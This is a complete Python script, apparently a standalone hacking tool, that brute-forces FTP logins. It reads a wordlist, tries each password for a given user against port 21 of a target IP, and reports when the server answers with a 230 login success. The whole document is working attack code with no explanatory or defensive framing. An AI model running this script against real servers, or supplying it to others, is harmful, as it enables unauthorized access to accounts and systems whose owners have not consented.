#!/usr/bin/python

import socket, sys,re

if len(sys.argv) != 4:
    print("Usage: ./ftp-brute.py <ip> <username> <wordlist>")
    sys.exit(0)

target = sys.argv[1]
user = sys.argv[2]
wordlist = sys.argv[3]

print("Target: %s"%(target))
print("User: %s"%(user))
print("Wordlist: %s"%(wordlist))

f = open(wordlist, "r")

for word in f.readlines():
    print("Running Brute Force in FTP: %s:%s"%(user,word))

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target, 21))
    s.recv(1024)

    s.send(bytes("USER %s\r\n" % user, "UTF-8"))
    s.recv(1024)
    s.send(bytes("PASS %s\r\n" % word, "UTF-8"))
    result = s.recv(1024)
    print(str(result, "UTF-8"))
    s.send(bytes("QUIT\r\n", "UTF-8"))

    if re.search('230', str(result, "UTF-8")):
        print("[+] Found! - User: %s Password: %s" % (user,word))
        break
    else:
        print("[-] Not Found!")